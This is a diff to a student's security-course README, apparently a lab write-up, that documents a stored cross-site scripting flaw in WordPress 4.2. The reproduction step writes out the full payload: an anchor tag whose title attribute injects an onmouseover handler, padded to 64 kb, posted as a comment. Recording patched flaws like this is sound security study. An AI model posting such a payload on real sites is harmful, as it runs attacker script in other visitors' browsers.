@@ -31,7 +31,7 @@ Time Spent: 11 Hours
     - Tested in version: 4.2
     - Fixed in version: 4.2.4
   - [ ] GIF Walkthrough: https://github.com/jarosales1029/Week-7-WordPress/blob/master/Week%207%20-%20Authenticated%20Stored%20XSS.gif
-  - [ ] Steps to recreate: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+  - [ ] Steps to recreate: Would post a comment with the following code // <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> //  The next user to view the code will have an XSS alert pop up with potential JavaScript code.
   - [ ] Affected source code:
     - [https://klikki.fi/adv/wordpress2.html]
 
